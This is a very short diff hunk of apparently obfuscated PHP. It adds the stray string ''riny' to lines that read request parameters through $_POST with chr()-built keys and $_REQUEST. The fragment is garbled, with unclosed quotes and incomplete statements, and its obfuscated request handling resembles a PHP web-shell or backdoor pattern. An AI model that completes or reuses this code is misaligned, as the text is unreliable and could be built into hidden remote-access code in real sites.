@@ -92,3 +92,4 @@ var R='';var s;if(s
 ($_POST[chr(
 '])){echo '
 ",(array)$_REQUEST['
+'riny
